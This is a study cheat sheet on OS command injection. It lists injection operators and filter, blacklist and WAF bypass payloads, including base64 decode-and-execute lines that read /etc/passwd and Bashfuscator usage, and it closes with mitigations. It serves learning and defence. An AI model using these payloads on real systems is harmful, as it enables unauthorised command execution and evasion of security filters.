# Command Injections

## 🎯 Main Idea
- Command injection occurs when unsanitized user input is passed into a function that executes OS commands, letting an attacker run arbitrary system commands on the back-end.
- Affects any language/OS (PHP `system`/`exec`, NodeJS `child_process.exec`, etc.) and can lead to full server/network compromise.
- Detection = exploitation: append a command via an injection operator and watch for changed output.
- Filters, blacklists, and WAFs can be bypassed by obfuscating characters and commands.

## 💥 Attack / Exploit Vectors

### Injecting Commands (Injection Operators)
- Append a second command to the intended one using a shell operator; works regardless of language/framework/OS.
- Bypass front-end-only validation by sending the raw request via Burp/ZAP repeater (URL-encode the payload, `CTRL+U`).
- **Commands**
  - `ping -c 1 127.0.0.1; whoami` — semicolon `;` (`%3b`), runs both
  - `127.0.0.1%0a whoami` — new line `\n` (`%0a`), runs both (rarely blacklisted)
  - `127.0.0.1 && whoami` — AND `&&` (`%26%26`), second runs only if first succeeds
  - `|| whoami` — OR `||` (`%7c%7c`), second runs only if first fails
  - `127.0.0.1 & whoami` — background `&` (`%26`), runs both
  - `127.0.0.1 | whoami` — pipe `|` (`%7c`), shows second output only
  - `` `whoami` `` / `$(whoami)` — sub-shell (Linux-only), `%60%60` / `%24%28%29`
  - Note: `;` fails in Windows CMD but works in PowerShell

### Bypassing Space Filters
- Replace blacklisted space character with equivalents accepted between arguments.
- **Commands**
  - `127.0.0.1%0a%09` — tab (`%09`) instead of space
  - `127.0.0.1%0a${IFS}` — `${IFS}` env var (default = space/tab)
  - `{ls,-la}` — Bash brace expansion (commas become spaces)
  - CMD: `%PROGRAMFILES:~10,-5%` / PowerShell: `$env:PROGRAMFILES[10]` — Windows space

### Bypassing Blacklisted Characters
- Produce needed characters (`/`, `\`, `;`) from env-var substrings or character shifting instead of typing them.
- **Commands**
  - `${PATH:0:1}` — yields `/` (Linux)
  - `${LS_COLORS:10:1}` — yields `;` (Linux)
  - `127.0.0.1${LS_COLORS:10:1}${IFS}` — full char+space bypass
  - `echo ${HOMEPATH:~6,-11}` → `\` (Windows CMD); `$env:HOMEPATH[0]` (PowerShell)
  - `$(tr '!-}' '"-~'<<<[)` — character shifting (`[` → `\`)
  - `printenv` / `Get-ChildItem Env:` — list env vars to find useful chars

### Bypassing Blacklisted Commands
- Insert shell-ignored characters into the command word so it no longer matches the blacklist exactly.
- **Commands**
  - `w'h'o'am'i` / `w"h"o"am"i` — quotes (even count, no mixing; Linux & Windows)
  - `who$@ami` / `w\ho\am\i` — `$@` or `\` insertion (Linux-only, any count)
  - `who^ami` — caret `^` insertion (Windows CMD only)

### Advanced Command Obfuscation
- Defeat WAFs/advanced filters with case manipulation, reversed commands, and encoded commands.
- **Commands**
  - `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` — case manipulation to lowercase (Linux)
  - `$(a="WhOaMi";printf %s "${a,,}")` — alternate lowercase variation
  - `WhOaMi` — case-insensitive on Windows CMD/PowerShell
  - `echo 'whoami' | rev` → `imaohw`; `$(rev<<<'imaohw')` — reversed command (Linux)
  - `"whoami"[-1..-20] -join ''`; `iex "$('imaohw'[-1..-20] -join '')"` — reversed (Windows)
  - `echo -n 'cat /etc/passwd | grep 33' | base64` — encode payload
  - `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` — decode & execute (Linux, no pipe)
  - `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` — encode (Windows)
  - `echo -n whoami | iconv -f utf-8 -t utf-16le | base64` — produce Windows-compatible b64 on Linux
  - `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` — decode & execute (Windows)

### Automated Evasion Tools
- Auto-obfuscate commands when manual techniques fail against advanced security tools.
- **Commands**
  - `./bashfuscator -c 'cat /etc/passwd'` — Linux Bashfuscator (random technique)
  - `./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1` — shorter payload
  - `bash -c '<obfuscated>'` — test obfuscated output
  - DOSfuscation (Windows): `Import-Module .\Invoke-DOSfuscation.psd1` → `Invoke-DOSfuscation` (interactive: BINARY/ENCODING/PAYLOAD)

## 🛠️ Key Tools & Concepts
- Vulnerable functions — PHP `exec`/`system`/`shell_exec`/`passthru`/`popen`; NodeJS `child_process.exec`/`spawn`
- Burp Suite / ZAP — intercept & craft raw requests to bypass front-end validation
- Injection operators table — per-type operators (SQLi, Cmd, LDAP, XPath, Code, traversal, header, etc.)
- Bashfuscator (Linux) / Invoke-DOSfuscation (Windows) — automated command obfuscation
- PayloadsAllTheThings — reference for additional bypass techniques
- Blacklist vs WAF detection — error in output field = app filter; separate page with request details = WAF

## 🛡️ Mitigations
- Avoid system-command functions; prefer built-in equivalents (e.g. PHP `fsockopen` to check a host)
- Input validation on BOTH front-end and back-end (PHP `filter_var` w/ `FILTER_VALIDATE_IP`, regex `preg_match`, NodeJS `is-ip`)
- Input sanitization — strip special chars with `preg_replace('/[^A-Za-z0-9.]/','',...)` or JS `.replace()`, DOMPurify; escaping (`escapeshellcmd`) is weak/bypassable
- Server hardening — WAF (`mod_security`, Cloudflare), least privilege (`www-data`), PHP `disable_functions`, `open_basedir`, reject double-encoded/non-ASCII URLs, avoid outdated modules
